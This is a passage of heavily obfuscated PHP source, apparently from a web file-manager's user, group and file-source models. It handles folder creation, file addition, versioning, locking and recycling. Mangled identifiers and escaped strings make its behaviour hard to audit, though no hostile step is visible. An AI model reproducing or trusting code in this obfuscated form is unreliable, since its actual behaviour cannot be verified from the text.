&$©üÕ±Ü) { $©üÕ±Ü[$ÙçºÈƒÎ[90]] = $õ¿õ©åû[$©üÕ±Ü[$ÙçºÈƒÎ[1589]]] ? $õ¿õ©åû[$©üÕ±Ü[$ÙçºÈƒÎ[1589]]] : array(); } unset($©üÕ±Ü); } private function _listAppendGroup(&$¿Úš¥¹, $İŞå©Ş) { $ñå£¡¯ =& $_SERVER[œ—üé‹ê]; $ğöõÜÙÒ = array($ñå£¡¯[1589] => array($ñå£¡¯[7], $İŞå©Ş)); $·¢“ºş¿ = Model($ñå£¡¯[2272])->where($ğöõÜÙÒ)->select(); $‘–¶Š© = array_to_keyvalue($·¢“ºş¿, $ñå£¡¯[12], $ñå£¡¯[1491]); $‘–¶Š© = array_remove_value(array_unique($‘–¶Š©), $ñå£¡¯[228]); if (!$‘–¶Š© || !$·¢“ºş¿) { return; } $ğöõÜÙÒ = array($ñå£¡¯[1491] => array($ñå£¡¯[7], $‘–¶Š©)); $ŞÑ¡•é± = Model($ñå£¡¯[1489])->field($ñå£¡¯[2710])->where($ğöõÜÙÒ)->select(); $ŞÑ¡•é± = array_to_keyvalue($ŞÑ¡•é±, $ñå£¡¯[1491]); $·¢“ºş¿ = array_to_keyvalue_group($·¢“ºş¿, $ñå£¡¯[1589]); foreach ($·¢“ºş¿ as &$•¡ÈúÎ˜) { $ù¦²š… = array(); foreach ($•¡ÈúÎ˜ as $ŞŸ¦ü×Â) { if (!$ŞŸ¦ü×Â[$ñå£¡¯[1637]]) { continue; } $›Âï¸´Ö = Model($ñå£¡¯[591])->listData($ŞŸ¦ü×Â[$ñå£¡¯[1637]]); $ù¦²š…[] = array($ñå£¡¯[1491] => $ŞŸ¦ü×Â[$ñå£¡¯[1491]], $ñå£¡¯[2711] => $ŞÑ¡•é±[$ŞŸ¦ü×Â[$ñå£¡¯[1491]]][$ñå£¡¯[32]], $ñå£¡¯[604] => $ŞÑ¡•é±[$ŞŸ¦ü×Â[$ñå£¡¯[1491]]][$ñå£¡¯[604]], $ñå£¡¯[502] => $›Âï¸´Ö); } $•¡ÈúÎ˜ = $ù¦²š…; } unset($•¡ÈúÎ˜); foreach ($¿Úš¥¹ as &$¢«À¦€ê) { $¢«À¦€ê[$ñå£¡¯[1490]] = array(); if (isset($·¢“ºş¿[$¢«À¦€ê[$ñå£¡¯[1589]]])) { $¢«À¦€ê[$ñå£¡¯[1490]] = $·¢“ºş¿[$¢«À¦€ê[$ñå£¡¯[1589]]]; } } unset($¢«À¦€ê); } public function userAppendGroup($†é…Ş­) { $ø£šŞ¸ =& $_SERVER[œ—üé‹ê]; if (!$†é…Ş­) { return array(); } $this->_listAppendGroup($†é…Ş­, array_to_keyvalue($†é…Ş­, $ø£šŞ¸[12], $ø£šŞ¸[1589])); return $†é…Ş­; } private function _listAppendMeta(&$Ñ¶î‡Ó°, $âÁü‰Š‚) { $—¶úĞ›ã =& $_SERVER[œ—üé‹ê]; $·Ş•°¿£ = UserJobModel::JOB_KEY; $ëãÅ¦Ş‡ = array($—¶úĞ›ã[2268]); $«Û’ˆ«Â = array($—¶úĞ›ã[1589] => array($—¶úĞ›ã[7], $âÁü‰Š‚)); $ËÖãÁ = Model($—¶úĞ›ã[2686])->where($«Û’ˆ«Â)->select(); $°ñğ­Ä = array(); foreach ($ËÖãÁ as $•„Ë•©Ì) { $Öëá”õç = $•„Ë•©Ì[$—¶úĞ›ã[1589]]; if (!isset($°ñğ­Ä[$Öëá”õç])) { $°ñğ­Ä[$Öëá”õç] = array(); } $°ñğ­Ä[$Öëá”õç][$•„Ë•©Ì[$—¶úĞ›ã[95]]] = $•„Ë•©Ì[$—¶úĞ›ã[451]]; } $É»öåáş = Model($—¶úĞ›ã[2712]); foreach ($Ñ¶î‡Ó° as &$çÈò¬…—) { $Öëá”õç = $çÈò¬…—[$—¶úĞ›ã[1589]]; $ùõÏÅ…Í = isset($°ñğ­Ä[$Öëá”õç]) ? $°ñğ­Ä[$Öëá”õç] : array(); $çÈò¬…—[$—¶úĞ›ã[555]] = array_field_key($ùõÏÅ…Í, $ëãÅ¦Ş‡); $çÈò¬…—[$—¶úĞ›ã[2713]] = array(); if (isset($ùõÏÅ…Í[$·Ş•°¿£])) { $çÈò¬…—[$—¶úĞ›ã[2713]] = $É»öåáş->getUserJobInfo($ùõÏÅ…Í[$·Ş•°¿£]); } } unset($çÈò¬…—); } protected function groupUserAll($ó×ãè¶) { $‡©ï•€Ÿ =& $_SERVER[œ—üé‹ê]; if (!$ó×ãè¶) { return !1; } $“”Ñ¬­­ = Model($‡©ï•€Ÿ[2272])->field($‡©ï•€Ÿ[1589])->where(array($‡©ï•€Ÿ[1491] => array($‡©ï•€Ÿ[7], $ó×ãè¶)))->select(); $“”Ñ¬­­ = array_to_keyvalue($“”Ñ¬­­, $‡©ï•€Ÿ[12], $‡©ï•€Ÿ[1589]); return array_unique($“”Ñ¬­­); } public function userSearch($ßÍÜÓ¨, $öë¼åúæ = "\x2a") { return Model($_SERVER[œ—üé‹ê][617])->where($ßÍÜÓ¨)->field($öë¼åúæ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($³ë…ìÎÄ) { return "\x55\x73\145\x72\117\x70\164\151\157\156\x5f{$³ë…ìÎÄ}\137" . KodUser::id(); } protected function filterWhere($—²ÆÙµ) { $—²ÆÙµ[$_SERVER[œ—üé‹ê][1589]] = KodUser::id(); return $—²ÆÙµ; } public function cacheRemoveUser($ƒ¥ªø«ü, $äªúÏ¶) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\x74\x69\157\156\x5f{$ƒ¥ªø«ü}\x5f" . $äªúÏ¶); } protected function optionDefault($ĞØ¨Å¢ = '') { $¸ä³È¯ =& $_SERVER[œ—üé‹ê]; if ($ĞØ¨Å¢ == $¸ä³È¯[12]) { return $GLOBALS[$¸ä³È¯[6]][$¸ä³È¯[2714]]; } if ($ĞØ¨Å¢ == $¸ä³È¯[2715]) { return $GLOBALS[$¸ä³È¯[6]][$¸ä³È¯[2716]]; } } } goto eùÁìì„¨; FºÜÙ¤Ç†É: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ùƒè»–‚) { $ù±¸êï =& $_SERVER[œ—üé‹ê]; $Ä”µù…Œ = Model($ù±¸êï[597])->where(array($ù±¸êï[1965] => $ùƒè»–‚))->find(); $ç£âşéö = $this->_mkdirRoot(SourceModel::TYPE_USER, $ùƒè»–‚, $Ä”µù…Œ[$ù±¸êï[32]]); $this->userDesktopAdd($ç£âşéö); return $ç£âşéö; } public function userDesktopAdd($ıâå ¡é) { $…Ê™“Û =& $_SERVER[œ—üé‹ê]; $§ëÕ³²´ = LNG($…Ê™“Û[2459]); $Œ´£“Ç = $this->mkdir($ıâå ¡é, $§ëÕ³²´); $this->metaSet($Œ´£“Ç, $…Ê™“Û[2460], $…Ê™“Û[91]); $this->metaSet($ıâå ¡é, $…Ê™“Û[2461], $Œ´£“Ç); } public function userPathSafeAdd($±‰Ÿ·ò) { $ÕæˆÓêÂ =& $_SERVER[œ—üé‹ê]; $Ÿ¼üŠ¸« = Model($ÕæˆÓêÂ[597])->getInfoFull($±‰Ÿ·ò); if (!$Ÿ¼üŠ¸«) { return !1; } if (_get($Ÿ¼üŠ¸«, $ÕæˆÓêÂ[618])) { return $Ÿ¼üŠ¸«[$ÕæˆÓêÂ[555]][$ÕæˆÓêÂ[2462]]; } $£’òÅ‚Ø = $this->_mkdirRoot(SourceModel::TYPE_USER, $±‰Ÿ·ò, $ÕæˆÓêÂ[2463], $ÕæˆÓêÂ[2464]); Model($ÕæˆÓêÂ[597])->metaSet($±‰Ÿ·ò, $ÕæˆÓêÂ[2462], $£’òÅ‚Ø); $this->metaSet($£’òÅ‚Ø, $ÕæˆÓêÂ[2465], $±‰Ÿ·ò); return $£’òÅ‚Ø; } public function userPathAppAdd($ßüĞ™öÈ, $„¹Ü£çß = '', $¸Î„Œ·ì = '') { $›ĞÉÃ„ =& $_SERVER[œ—üé‹ê]; $òÏŒ÷ö = Model($›ĞÉÃ„[597])->getInfoFull($ßüĞ™öÈ); if (!$òÏŒ÷ö) { return !1; } $‡ªö£€‰ = $òÏŒ÷ö[$›ĞÉÃ„[555]] ? $òÏŒ÷ö[$›ĞÉÃ„[555]] : array(); $ğ«ëš® = $‡ªö£€‰[$›ĞÉÃ„[2466]]; if (!$ğ«ëš®) { $ğ«ëš® = $this->_mkdirRoot(SourceModel::TYPE_USER, $ßüĞ™öÈ, $›ĞÉÃ„[2467], $›ĞÉÃ„[2468]); Model($›ĞÉÃ„[597])->metaSet($ßüĞ™öÈ, $›ĞÉÃ„[2466], $ğ«ëš® . $›ĞÉÃ„[12]); $this->metaSet($ğ«ëš®, $›ĞÉÃ„[2466], $ßüĞ™öÈ); } if (!$„¹Ü£çß) { return $ğ«ëš®; } $íšìæ©Í = $‡ªö£€‰[$›ĞÉÃ„[2469] . $„¹Ü£çß]; if (!$íšìæ©Í) { $íšìæ©Í = $this->mkdir($ğ«ëš®, $„¹Ü£çß); Model($›ĞÉÃ„[597])->metaSet($ßüĞ™öÈ, $›ĞÉÃ„[2469] . $„¹Ü£çß, $íšìæ©Í); $this->metaSet($íšìæ©Í, $›ĞÉÃ„[2469] . $„¹Ü£çß, $ßüĞ™öÈ); } if (!$¸Î„Œ·ì) { return $íšìæ©Í; } $¿‘ûœƒ÷ = $this->mkdir($íšìæ©Í, $¸Î„Œ·ì); return $¿‘ûœƒ÷; } public function groupRootAdd($ê¯è¾µ£) { $ÙÑò¾ÂŞ =& $_SERVER[œ—üé‹ê]; $öšË¸İØ = Model($ÙÑò¾ÂŞ[605])->where(array($ÙÑò¾ÂŞ[2265] => $ê¯è¾µ£))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ê¯è¾µ£, $öšË¸İØ[$ÙÑò¾ÂŞ[32]]); } public function systemRootPathAdd($½ğõ¶) { if ($½ğõ¶ != $_SERVER[œ—üé‹ê][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $½ğõ¶); } public function userRootRemove($‰·é‘Íø) { $™íİ„ = $this->targetSourceRoot(SourceModel::TYPE_USER, $‰·é‘Íø, !0); foreach ($™íİ„ as $·ı‹Î‘²) { if (!$·ı‹Î‘²) { continue; } $this->remove($·ı‹Î‘²[$_SERVER[œ—üé‹ê][191]], !1); } } public function groupRootRemove($–Ÿıà‚¦) { $Ş¤“³Á = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $–Ÿıà‚¦); if (!$Ş¤“³Á) { return; } $this->remove($Ş¤“³Á[$_SERVER[œ—üé‹ê][191]], !1); } private function _mkdirRoot($’õ¤Ê—ß, $€”¼Æ«ñ, $Šì éåÄ, $Ñ§½º¢ = '') { $ğü”Ÿ­ =& $_SERVER[œ—üé‹ê]; $Ö·›ª¸ç = KodUser::id(); $Ü–­”Ù = array($ğü”Ÿ­[492] => 0, $ğü”Ÿ­[670] => $’õ¤Ê—ß, $ğü”Ÿ­[671] => $€”¼Æ«ñ, $ğü”Ÿ­[668] => 1, $ğü”Ÿ­[672] => $Ö·›ª¸ç, $ğü”Ÿ­[673] => $Ö·›ª¸ç, $ğü”Ÿ­[669] => $Ñ§½º¢, $ğü”Ÿ­[674] => $ğü”Ÿ­[613], $ğü”Ÿ­[519] => 0, $ğü”Ÿ­[640] => 0, $ğü”Ÿ­[558] => 0, $ğü”Ÿ­[675] => $ğü”Ÿ­[12]); if ($ëø†…‡¡ = $this->where($Ü–­”Ù)->find()) { return $ëø†…‡¡[$ğü”Ÿ­[191]]; } $ö¤æÛÆ = "\115\x6f\144\x65\154\x53\x6f\x75\162\143\x65\56\155\x6b\144\x69\162\x52\x6f\x6f\x74\x2e{$’õ¤Ê—ß}\56{$€”¼Æ«ñ}\x2e" . $Šì éåÄ; CacheLock::lock($ö¤æÛÆ); $Ü–­”Ù[$ğü”Ÿ­[32]] = $Šì éåÄ; $“¤÷Ÿœí = $this->add($Ü–­”Ù); $†ì‚¾ù¬ = array($ğü”Ÿ­[676] => short_id($“¤÷Ÿœí)); $this->where(array($ğü”Ÿ­[506] => $“¤÷Ÿœí))->save($†ì‚¾ù¬); CacheLock::unlock($ö¤æÛÆ); return $“¤÷Ÿœí; } private function targetSourceRoot($£Œ¦ˆ¸Ç, $–©úğÊ¯, $§™üéÅ¹ = false) { $î­Êè† =& $_SERVER[œ—üé‹ê]; $‹èî¯ƒ = array($î­Êè†[492] => 0, $î­Êè†[670] => $£Œ¦ˆ¸Ç, $î­Êè†[671] => $–©úğÊ¯); if ($§™üéÅ¹) { $øö·ÎÉ“ = $this->where($‹èî¯ƒ)->select(); return $øö·ÎÉ“ ? $øö·ÎÉ“ : array(); } $”šè½³Ü = $this->where($‹èî¯ƒ)->find(); return $”šè½³Ü ? $”šè½³Ü : array(); } public function sourceRootGroup($¦šç®û³) { $àù¡³› =& $_SERVER[œ—üé‹ê]; if (is_string($¦šç®û³)) { $¦šç®û³ = array($¦šç®û³); } $Ê®ŸÕä° = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¦šç®û³, $àù¡³›[220]); $Ç¯ÀÓ¸¸ = array($àù¡³›[446] => $Ê®ŸÕä°, $àù¡³›[443] => array($àù¡³›[868] => count($¦šç®û³))); $this->_listDataApply($Ç¯ÀÓ¸¸[$àù¡³›[446]]); $this->_listMake($Ç¯ÀÓ¸¸); return array_to_keyvalue($Ç¯ÀÓ¸¸[$àù¡³›[85]], $àù¡³›[589]); } public function mkfile($‡À˜§ÔÏ, $‚ˆâ›®Ã, $º ­ÔÁ¨ = '', $ºÖÓË’ = REPEAT_RENAME) { $ò‰ÖğúÏ =& $_SERVER[œ—üé‹ê]; $½ü”ñˆú = KodIO::ioFileDriverGet($ò‰ÖğúÏ[498] . $‡À˜§ÔÏ . $ò‰ÖğúÏ[402]); $“ÇáãÏ‰ = Model($ò‰ÖğúÏ[696])->addFileByContent($º ­ÔÁ¨, $½ü”ñˆú, $‚ˆâ›®Ã); return $this->_createFileCall($‡À˜§ÔÏ, $‚ˆâ›®Ã, $“ÇáãÏ‰, $ºÖÓË’, $ò‰ÖğúÏ[1539]); } public function addFile($„éÄßóş, $Ãªî¥Ö“, $üã‘ÏÔ, $©“»ƒÛ» = false, $Àßª‰—Š = REPEAT_RENAME) { $½ØÏÆŠ• =& $_SERVER[œ—üé‹ê]; $†­ó§Ö’ = KodIO::ioFileDriverGet($½ØÏÆŠ•[498] . $„éÄßóş . $½ØÏÆŠ•[402]); $ëŞšêï¥ = Model($½ØÏÆŠ•[696])->addFile($Ãªî¥Ö“, $†­ó§Ö’, $üã‘ÏÔ, $©“»ƒÛ»); return $this->_createFileCall($„éÄßóş, $üã‘ÏÔ, $ëŞšêï¥, $Àßª‰—Š); } public function addFileByFileID($Ø§—ñÓÇ, $ë”¡Ñ±œ, $™ïÂúñ, $º–„³“Í = REPEAT_RENAME) { $ãÁÇ¨Ñ· =& $_SERVER[œ—üé‹ê]; $£™ú€’ = Model($ãÁÇ¨Ñ·[696])->find($ë”¡Ñ±œ); Model($ãÁÇ¨Ñ·[696])->linkAdd($ë”¡Ñ±œ); return $this->_createFileCall($Ø§—ñÓÇ, $™ïÂúñ, $£™ú€’, $º–„³“Í); } public function addFileByRemote($‡•—Ä¡, $İÖƒÁŠ×, $ôÍŸÏ ó, $›ÏçÕˆö = array(), $ê·¾î† = REPEAT_RENAME) { $›îªÈÒ› = Model($_SERVER[œ—üé‹ê][696])->addFileByRemote($İÖƒÁŠ×, $ôÍŸÏ ó, $›ÏçÕˆö); return $this->_createFileCall($‡•—Ä¡, $ôÍŸÏ ó, $›îªÈÒ›, $ê·¾î†); } private function _createFileCall($•Ë³ûË, $¾½â¬å, $êÀäÑ¦, $¢äÇ¸òë, $õÌŞ•…î = "\x75\160\154\157\x61\144") { $¡­Á“µ‚ =& $_SERVER[œ—üé‹ê]; if (!$êÀäÑ¦) { return !1; } $¼ï…İÃ = !1; $this->setMasterDB(); $this->lockWriteStart($•Ë³ûË, $¾½â¬å); $•±“œ„ = $this->fileNameExist($•Ë³ûË, $¾½â¬å); $õÈ£êî¬ = $this->_createFile($•Ë³ûË, $¾½â¬å, $êÀäÑ¦, $¢äÇ¸òë, $¼ï…İÃ); if (!$¼ï…İÃ) { Model($¡­Á“µ‚[560])->remove($êÀäÑ¦[$¡­Á“µ‚[557]]); } if ($¼ï…İÃ && $õÈ£êî¬ && $õÈ£êî¬ != $•±“œ„) { Model($¡­Á“µ‚[2432])->eventCreate($õÈ£êî¬, $õÌŞ•…î); } $this->lockWriteEnd($•Ë³ûË, $¾½â¬å); return $õÈ£êî¬; } public function mkdir($Ïà®Şı§, $ğ‡‰Æ›ó, $ØÎïÄ÷Ä = REPEAT_SKIP) { $Ü‘¤¤ûá =& $_SERVER[œ—üé‹ê]; $this->setMasterDB(); $•†Ğ»¶Å = $this->sourceInfo($Ïà®Şı§); if (!$•†Ğ»¶Å) { return !1; } $this->lockWriteStart($Ïà®Şı§, $ğ‡‰Æ›ó); if ($ØÎïÄ÷Ä !== !1) { $¶ğ¦ßÛ˜ = $this->fileNameExist($Ïà®Şı§, $ğ‡‰Æ›ó); if ($¶ğ¦ßÛ˜ && $ØÎïÄ÷Ä != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ïà®Şı§, $ğ‡‰Æ›ó); return $¶ğ¦ßÛ˜; } $ğ‡‰Æ›ó = $this->fileNameAuto($Ïà®Şı§, $ğ‡‰Æ›ó, $ØÎïÄ÷Ä); } $ó¼›ã‘± = array($Ü‘¤¤ûá[668] => 1, $Ü‘¤¤ûá[509] => $ğ‡‰Æ›ó, $Ü‘¤¤ûá[669] => $Ü‘¤¤ûá[12], $Ü‘¤¤ûá[558] => 0, $Ü‘¤¤ûá[640] => 0); $Ûğ”„Ú = $this->_addSource($ó¼›ã‘±, $•†Ğ»¶Å); Model($Ü‘¤¤ûá[2432])->eventCreate($Ûğ”„Ú, $Ü‘¤¤ûá[1540]); $this->lockWriteEnd($Ïà®Şı§, $ğ‡‰Æ›ó); return $Ûğ”„Ú; } public function listSourceRoot($ø–”ïÒç, $©¸®Â‘À, $ù»€‰šï = "\x73\x6f\x75\x72\x63\x65\x49\x44\x2c\164\141\162\147\x65\164\x49\104\x2c\163\151\x7a\x65") { $şÕÑ§Œ½ =& $_SERVER[œ—üé‹ê]; $Œî¹İõè = $şÕÑ§Œ½[463]; $ÑÂò“”É = array(); $¸Ñî™àÚ = 1024 * 50; $”Û•Î®Ê = is_array($”Û•Î®Ê) ? $”Û•Î®Ê : array(); $ıÛıÉ¤Ë = count($©¸®Â‘À); $¬Â²°ßÈ = $this->tablePrefix . $şÕÑ§Œ½[470]; for ($ÇÕ¨Ÿ†ô = 0; $ÇÕ¨Ÿ†ô < $ıÛıÉ¤Ë; $ÇÕ¨Ÿ†ô++) { $•¯Ö¼ë = $©¸®Â‘À[$ÇÕ¨Ÿ†ô]; $Œî¹İõè .= "\123\x45\114\105\x43\124\x20\52\40\106\x52\x4f\x4d\x20\x28\x53\105\114\x45\x43\124\40{$ù»€‰šï}\40\x46\122\x4f\x4d\40\x60{$¬Â²°ßÈ}\140\40\127\110\x45\x52\x45\x20"; $Œî¹İõè .= "\x60\160\141\162\145\x6e\x74\111\104\140\x3d\60\40\x41\116\x44\40\140\x74\x61\162\x67\x65\x74\111\104\140\75{$•¯Ö¼ë}\40\101\x4e\x44\x20\140\x74\x61\162\147\145\x74\124\171\160\x65\x60\x3d{$ø–”ïÒç}\40\141\156\x64\40\146\x69\x6c\x65\x54\x79\160\145\x3d\47\47\40\154\151\x6d\x69\x74\40\61\51\40\141\x73\40\164\x62\137{$ÇÕ¨Ÿ†ô}\x20\x55\116\111\x4f\116\40\101\114\114\x20"; if ((strlen($Œî¹İõè) >= $¸Ñî™àÚ || $ÇÕ¨Ÿ†ô == $ıÛıÉ¤Ë - 1) && $Œî¹İõè) { $Œî¹İõè = substr($Œî¹İõè, 0, -strlen($şÕÑ§Œ½[1205])); $°Ì£´…í = $this->query($Œî¹İõè); $Œî¹İõè = $şÕÑ§Œ½[12]; $ÑÂò“”É = array_merge($ÑÂò“”É, $°Ì£´…í); } } return $ÑÂò“”É; } private function _createFile($¼¼Ù„ªÚ, $–Šñ÷•™, $´¤½‡™Ö, $µ²ñè¥, &$ää•œŠ) { $äüü¨áß =& $_SERVER[œ—üé‹ê]; $ÓÄâÛù = $this->sourceInfo($¼¼Ù„ªÚ); if (!$´¤½‡™Ö || !$ÓÄâÛù) { return !1; } if ($µ²ñè¥ !== !1) { $¿ÌÑïİï = $this->fileNameExist($¼¼Ù„ªÚ, $–Šñ÷•™); } $ää•œŠ = !0; if ($µ²ñè¥ && $¿ÌÑïİï) { if ($µ²ñè¥ == REPEAT_SKIP) { $ää•œŠ = !1; return $¿ÌÑïİï; } else { if ($µ²ñè¥ == REPEAT_REPLACE) { $à‰¯İô± = $this->sourceInfo($¿ÌÑïİï); $²îšëŞï = $this->fileHistory($à‰¯İô±, $´¤½‡™Ö[$äüü¨áß[557]], $´¤½‡™Ö[$äüü¨áß[79]]); if (!$²îšëŞï) { $ää•œŠ = !1; } else { $this->folderSizeReset($¼¼Ù„ªÚ); } return $¿ÌÑïİï; } else { $–Šñ÷•™ = $this->fileNameAuto($¼¼Ù„ªÚ, $–Šñ÷•™, $µ²ñè¥, !1); } } } $Ò€Úåì = array($äüü¨áß[668] => 0, $äüü¨áß[509] => $–Šñ÷•™, $äüü¨áß[669] => substr(get_path_ext($–Šñ÷•™), 0, 10), $äüü¨áß[558] => $´¤½‡™Ö[$äüü¨áß[557]], $äüü¨áß[640] => $´¤½‡™Ö[$äüü¨áß[79]]); $ôµÄÃË¡ = $this->_addSource($Ò€Úåì, $ÓÄâÛù); $this->folderSizeReset($¼¼Ù„ªÚ, intval($Ò€Úåì[$äüü¨áß[79]])); return $ôµÄÃË¡; } protected function fileHistory($¼˜ëŞ„…, $ø£¼©š, $Ïü­è«â) { $ÁÆ€¨ùé =& $_SERVER[œ—üé‹ê]; if ($¼˜ëŞ„…[$ÁÆ€¨ùé[557]] == $ø£¼©š) { return !1; } $this->checkLock($¼˜ëŞ„…[$ÁÆ€¨ùé[191]], $ø£¼©š); Model($ÁÆ€¨ùé[2470])->addHistory($¼˜ëŞ„…); $¬¿¾®ÂŒ = array($ÁÆ€¨ùé[673] => USER_ID, $ÁÆ€¨ùé[513] => time(), $ÁÆ€¨ùé[557] => $ø£¼©š, $ÁÆ€¨ùé[79] => $Ïü­è«â); $this->where(array($ÁÆ€¨ùé[506] => $¼˜ëŞ„…[$ÁÆ€¨ùé[191]]))->save($¬¿¾®ÂŒ); $this->sourceCacheClear($¼˜ëŞ„…[$ÁÆ€¨ùé[191]]); return !0; } public function checkLock($Î²­·Ÿ„, $åÀŸÀ‘²) { $¶ÃñÒñÓ =& $_SERVER[œ—üé‹ê]; $ôÖÔû² = $this->pathInfo($Î²­·Ÿ„); if (!$this->fileIsLock($ôÖÔû², !0)) { return; } $™†¶‘„ = Session::get($¶ÃñÒñÓ[2471]); $ØÜÏŞ¥ = substr($ôÖÔû²[$¶ÃñÒñÓ[32]], 0, -1 - strlen($ôÖÔû²[$¶ÃñÒñÓ[166]])) . $¶ÃñÒñÓ[1394] . $™†¶‘„ . $¶ÃñÒñÓ[10] . $ôÖÔû²[$¶ÃñÒñÓ[166]]; $¥»ÛœçÈ = Model($¶ÃñÒñÓ[696])->find($åÀŸÀ‘²); $this->_createFileCall($ôÖÔû²[$¶ÃñÒñÓ[190]], $ØÜÏŞ¥, $¥»ÛœçÈ, REPEAT_REPLACE, $¶ÃñÒñÓ[1539]); $«Ò™øæ = $ôÖÔû²[$¶ÃñÒñÓ[555]][$¶ÃñÒñÓ[633]]; $Î¸ºñ•İ = $«Ò™øæ[$¶ÃñÒñÓ[2472]] ? $«Ò™øæ[$¶ÃñÒñÓ[2472]] : $«Ò™øæ[$¶ÃñÒñÓ[32]]; show_json(LNG($¶ÃñÒñÓ[2473]) . $¶ÃñÒñÓ[2474] . LNG($¶ÃñÒñÓ[2475]) . $¶ÃñÒñÓ[2476] . $Î¸ºñ•İ . $¶ÃñÒñÓ[2477], !1); } public function fileIsLock($Ö®÷à³, $Í¦ÖÜŞ´ = false) { $Ğ¬¡¼š =& $_SERVER[œ—üé‹ê]; if (!_get($Ö®÷à³, $Ğ¬¡¼š[629], 0)) { return !1; } if ($Ö®÷à³[$Ğ¬¡¼š[555]][$Ğ¬¡¼š[632]] != USER_ID) { return !0; } $Ø†ÉãÁ = $GLOBALS[$Ğ¬¡¼š[6]][$Ğ¬¡¼š[92]][$Ğ¬¡¼š[630]]; if ($Ö®÷à³[$Ğ¬¡¼š[555]][$Ğ¬¡¼š[631]] <= time() - $Ø†ÉãÁ) { $this->metaSet($Ö®÷à³[$Ğ¬¡¼š[191]], $Ğ¬¡¼š[632], null); $this->metaSet($Ö®÷à³[$Ğ¬¡¼š[191]], $Ğ¬¡¼š[631], null); } if ($Í¦ÖÜŞ´) { $this->metaSet($Ö®÷à³[$Ğ¬¡¼š[191]], $Ğ¬¡¼š[631], time()); } return !1; } private function _addSource($ÎÎ±‘×û, $œŠÀıó’) { $¯£¬º¿¾ =& $_SERVER[œ—üé‹ê]; $­®¯ÉæÂ = KodUser::id(); $ëßëÜ¿ı = array($¯£¬º¿¾[670] => $œŠÀıó’[$¯£¬º¿¾[188]], $¯£¬º¿¾[671] => $œŠÀıó’[$¯£¬º¿¾[589]], $¯£¬º¿¾[672] => $­®¯ÉæÂ, $¯£¬º¿¾[673] => $­®¯ÉæÂ, $¯£¬º¿¾[492] => $œŠÀıó’[$¯£¬º¿¾[191]], $¯£¬º¿¾[674] => $œŠÀıó’[$¯£¬º¿¾[604]] . $œŠÀıó’[$¯£¬º¿¾[191]] . $¯£¬º¿¾[50], $¯£¬º¿¾[519] => 0, $¯£¬º¿¾[675] => $¯£¬º¿¾[12]); $ÎÎ±‘×û = array_merge($ëßëÜ¿ı, $ÎÎ±‘×û); $this->updateModifyTime($ÎÎ±‘×û[$¯£¬º¿¾[190]]); $Ú¢ó·üÄ = $¯£¬º¿¾[2478] . $œŠÀıó’[$¯£¬º¿¾[191]]; if (isset(self::$cacheChildList[$Ú¢ó·üÄ])) { unset(self::$cacheChildList[$Ú¢ó·üÄ]); } static $î„Ü™ß = false; if (!$î„Ü™ß) { Hook::trigger($¯£¬º¿¾[658], $ÎÎ±‘×û); $î„Ü™ß = !0; } $ä¢…¬è = $this->add($ÎÎ±‘×û); $¼ÖÔ¨ Ë = array($¯£¬º¿¾[676] => short_id($ä¢…¬è)); $this->where(array($¯£¬º¿¾[506] => $ä¢…¬è))->save($¼ÖÔ¨ Ë); $this->setNamePinyin($ä¢…¬è, $ÎÎ±‘×û[$¯£¬º¿¾[32]]); return $ä¢…¬è; } public function remove($–„ò³­›, $äîÇ½ = true) { $ı‡Êûı“ =& $_SERVER[œ—üé‹ê]; $›ª¼¨®¦ = $this->sourceInfo($–„ò³­›); $¼¦áŸÄ™ = intval($›ª¼¨®¦[$ı‡Êûı“[188]]) === self::TYPE_SYSTEM; $öÉªÌã¦ = Model($ı‡Êûı“[522])->get($ı‡Êûı“[2479]) == $ı‡Êûı“[91]; if ($¼¦áŸÄ™ || $äîÇ½ || !$öÉªÌã¦) { return $this->removeNow($–„ò³­›, $äîÇ½); } $ış•°¼Ô = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ù·ñÎÇ¤ = $›ª¼¨®¦[$ı‡Êûı“[188]] == self::TYPE_USER ? $ı‡Êûı“[684] : $ı‡Êûı“[598]; if ($ù·ñÎÇ¤ == $ı‡Êûı“[684]) { $×—°ï¢Ç = Model($ı‡Êûı“[597])->getInfo($›ª¼¨®¦[$ı‡Êûı“[589]]); $ŠÍ‰óÆ = !empty($×—°ï¢Ç[$ı‡Êûı“[2472]]) ? $×—°ï¢Ç[$ı‡Êûı“[2472]] : $×—°ï¢Ç[$ı‡Êûı“[32]]; $ŠÍ‰óÆ = $ı‡Êûı“[337] . $ŠÍ‰óÆ . $ı‡Êûı“[2480] . $›ª¼¨®¦[$ı‡Êûı“[589]]; } else { $×—°ï¢Ç = Model($ı‡Êûı“[605])->getInfo($›ª¼¨®¦[$ı‡Êûı“[589]]); $ŠÍ‰óÆ = _get($×—°ï¢Ç, $ı‡Êûı“[32]); $ŠÍ‰óÆ = $ı‡Êûı“[173] . $ŠÍ‰óÆ . $ı‡Êûı“[2481] . $›ª¼¨®¦[$ı‡Êûı“[589]]; } $ÙŞ± ú™ = $ı‡Êûı“[2482] . md5($ŠÍ‰óÆ); CacheLock::lock($ÙŞ± ú™); $¯±ÉÆıÈ = $this->fileNameExist($ış•°¼Ô, $ŠÍ‰óÆ); if (!$¯±ÉÆıÈ) { $¯±ÉÆıÈ = $this->mkdir($ış•°¼Ô, $ŠÍ‰óÆ, REPEAT_SKIP); $this->metaSet($¯±ÉÆıÈ, $ı‡Êûı“[2483], $ù·ñÎÇ¤); $this->metaSet($¯±ÉÆıÈ, $ı‡Êûı“[2484], $›ª¼¨®¦[$ı‡Êûı“[589]]); if ($›ª¼¨®¦[$ı‡Êûı“[190]] != 0) { $this->metaSet($¯±ÉÆıÈ, $ı‡Êûı“[2485], _get($×—°ï¢Ç, $ı‡Êûı“[2486])); } } CacheLock::unlock($ÙŞ± ú™); $this->metaSet($–„ò³­›, $ı‡Êûı“[2487], $›ª¼¨®¦[$ı‡Êûı“[190]]); $this->where(array($ı‡Êûı“[191] => $–„ò³­›))->save(array($ı‡Êûı“[513] => time())); 